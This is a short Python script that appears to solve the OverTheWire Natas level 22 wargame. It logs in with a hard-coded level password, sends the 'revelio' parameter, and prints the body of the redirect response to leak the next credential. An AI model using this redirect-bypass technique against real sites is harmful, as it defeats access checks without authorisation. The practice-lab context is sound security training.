import requests
username="natas22"
password="chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
host="http://natas22.natas.labs.overthewire.org/"
r = requests.get(host,params={'revelio':"true"},auth=(username,password))
print r.history[0].text
